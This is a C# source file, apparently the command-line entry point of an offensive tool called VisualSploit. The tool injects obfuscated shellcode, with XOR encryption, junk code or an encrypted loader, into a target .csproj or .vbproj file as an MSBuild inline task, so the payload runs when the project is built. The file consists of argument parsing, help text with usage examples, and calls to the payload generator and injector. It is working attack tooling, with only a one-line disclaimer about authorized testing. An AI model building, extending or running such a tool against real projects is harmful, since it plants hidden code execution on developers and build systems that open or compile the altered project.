using VisualSploit.Obfuscation;

namespace VisualSploit;

class Program
{
    const string Banner = "VisualSploit - MSBuild Inline Task Injection";

    static int Main(string[] args)
    {
        try
        {
            if (args.Length == 0 || args.Contains("-h") || args.Contains("--help"))
            {
                ShowHelp();
                return 0;
            }

            if (args.Contains("-v") || args.Contains("--version"))
            {
                Console.WriteLine("VisualSploit");
                return 0;
            }

            var options = ParseArgs(args);

            Console.WriteLine(Banner);
            Console.WriteLine();

            Console.Write("[*] Generating inline task... ");
            var payload = Payload.Generate(options.ShellcodePath, options.ObfuscationConfig);
            Console.WriteLine("done");

            if (options.ObfuscationConfig.UseObfuscation)
                Console.WriteLine($"[*] Obfuscation: {options.ObfuscationConfig.Methods}");

            Console.Write("[*] Injecting payload... ");
            Injector.Inject(options.ProjectPath, payload, options.Output, !options.NoBackup);
            Console.WriteLine("done");

            var outputPath = options.Output ?? options.ProjectPath;
            Console.WriteLine($"[+] Success: {outputPath}");

            if (!options.NoBackup && options.Output == null)
                Console.WriteLine($"[+] Backup: {options.ProjectPath}.bak");

            return 0;
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[!] Error: {ex.Message}");
            return 1;
        }
    }

    static CliOptions ParseArgs(string[] args)
    {
        string? projectPath = null;
        string? shellcodePath = null;
        string? output = null;
        bool noBackup = false;
        bool useEncryptedLoader = false;
        ObfuscationMethods methods = ObfuscationMethods.None;
        int xorRounds = 3;
        int? seed = null;

        for (int i = 0; i < args.Length; i++)
        {
            var arg = args[i];

            if (arg == "-o" || arg == "--output")
            {
                if (i + 1 >= args.Length)
                    throw new ArgumentException("Missing value for -o");
                output = args[++i];
            }
            else if (arg == "--no-backup")
            {
                noBackup = true;
            }
            else if (arg == "-e" || arg == "--encrypt")
            {
                useEncryptedLoader = true;
            }
            else if (arg == "-m" || arg == "--methods")
            {
                if (i + 1 >= args.Length)
                    throw new ArgumentException("Missing value for -m");
                methods = ParseMethods(args[++i]);
            }
            else if (arg == "-r" || arg == "--rounds")
            {
                if (i + 1 >= args.Length)
                    throw new ArgumentException("Missing value for -r");
                xorRounds = int.Parse(args[++i]);
                if (xorRounds < 1 || xorRounds > 5)
                    throw new ArgumentException("XOR rounds must be between 1 and 5");
            }
            else if (arg == "-s" || arg == "--seed")
            {
                if (i + 1 >= args.Length)
                    throw new ArgumentException("Missing value for -s");
                seed = int.Parse(args[++i]);
            }
            else if (projectPath == null)
            {
                projectPath = arg;
            }
            else if (shellcodePath == null)
            {
                shellcodePath = arg;
            }
            else
            {
                throw new ArgumentException($"Unexpected argument: {arg}");
            }
        }

        if (projectPath == null || shellcodePath == null)
            throw new ArgumentException("Missing required arguments. Use --help for usage.");

        var useObfuscation = methods != ObfuscationMethods.None;

        var config = new ObfuscationConfig(
            UseObfuscation: useObfuscation,
            UseEncryptedLoader: useEncryptedLoader,
            Methods: methods,
            XorRounds: xorRounds,
            Seed: seed
        );

        return new CliOptions(projectPath, shellcodePath, output, noBackup, config);
    }

    static ObfuscationMethods ParseMethods(string methodsStr)
    {
        var methods = ObfuscationMethods.None;
        var parts = methodsStr.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);

        foreach (var part in parts)
        {
            methods |= part.ToLower() switch
            {
                "shellcode" => ObfuscationMethods.ShellcodeEncryption,
                "junk" => ObfuscationMethods.JunkCodeInjection,
                _ => throw new ArgumentException($"Unknown obfuscation method: {part}")
            };
        }

        return methods;
    }


    static void ShowHelp()
    {
        Console.WriteLine(Banner);
        Console.WriteLine();
        Console.WriteLine("Usage:");
        Console.WriteLine("  visualsploit <project> <shellcode> [options]");
        Console.WriteLine();
        Console.WriteLine("Arguments:");
        Console.WriteLine("  <project>           Target .csproj or .vbproj file");
        Console.WriteLine("  <shellcode>         Shellcode file (raw bytes or hex)");
        Console.WriteLine();
        Console.WriteLine("Options:");
        Console.WriteLine("  -o, --output <f>    Output path (default: in-place)");
        Console.WriteLine("  --no-backup         Skip backup");
        Console.WriteLine("  -m, --methods <l>   Obfuscation: shellcode,junk");
        Console.WriteLine("  -e, --encrypt       Encrypted payload loader");
        Console.WriteLine("  -r, --rounds <n>    XOR rounds 1-5 (default: 3)");
        Console.WriteLine("  -s, --seed <n>      RNG seed for reproducibility");
        Console.WriteLine("  -h, --help          Show help");
        Console.WriteLine("  -v, --version       Show version");
        Console.WriteLine();
        Console.WriteLine("Examples:");
        Console.WriteLine("  visualsploit target.csproj payload.bin");
        Console.WriteLine("  visualsploit target.csproj payload.bin -m shellcode,junk");
        Console.WriteLine("  visualsploit target.csproj payload.bin -e");
        Console.WriteLine("  visualsploit target.csproj payload.bin -m shellcode,junk -e -s 12345");
        Console.WriteLine();
        Console.WriteLine("For authorized security testing only.");
    }

    record CliOptions(string ProjectPath, string ShellcodePath, string? Output, bool NoBackup, ObfuscationConfig ObfuscationConfig);
}
